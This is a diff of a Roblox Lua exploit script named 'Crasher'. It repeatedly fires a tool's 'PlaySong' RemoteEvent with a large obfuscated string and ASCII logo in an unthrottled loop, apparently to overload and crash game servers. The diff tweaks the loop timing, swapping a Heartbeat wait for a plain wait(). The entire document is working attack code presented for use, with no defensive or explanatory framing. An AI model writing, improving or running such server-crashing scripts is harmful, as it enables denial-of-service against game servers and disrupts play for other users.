@@ -2,7 +2,7 @@ local Me = game:GetService("Players").LocalPlayer
 local Char = Me.Character
 local BPack = Me.Backpack
 local RS = game:GetService("RunService")
-local HB = RS.Heartbeat
+local RSRend = RS.RenderStepped
 local Logo = [[
 _________               .__                   ____  ___
 \_   ___ \___.__.______ |  |__   ___________  \   \/  /
@@ -44,9 +44,10 @@ end)
 ConvertID = confuzzle(Bait) .. string.rep("\n\r", 2) .. Logo .. string.rep("\n\r", 1) .. "&Enviie Is Here" .. ConvertID
 local Tool = BPack:FindFirstChildOfClass("Tool") or Char:FindFirstChildOfClass("Tool")
 local Play = Tool:FindFirstChildOfClass("RemoteEvent", true)
-while _G.Crasher and HB:wait() do
+while _G.Crasher do
     if Tool and Play then
         Tool.Parent = Char
-        Play:FireServer("PlaySong", "" .. ConvertID)   
+        Play:FireServer("PlaySong", "" .. ConvertID)  
+        wait()
     end    
-end    
+end   
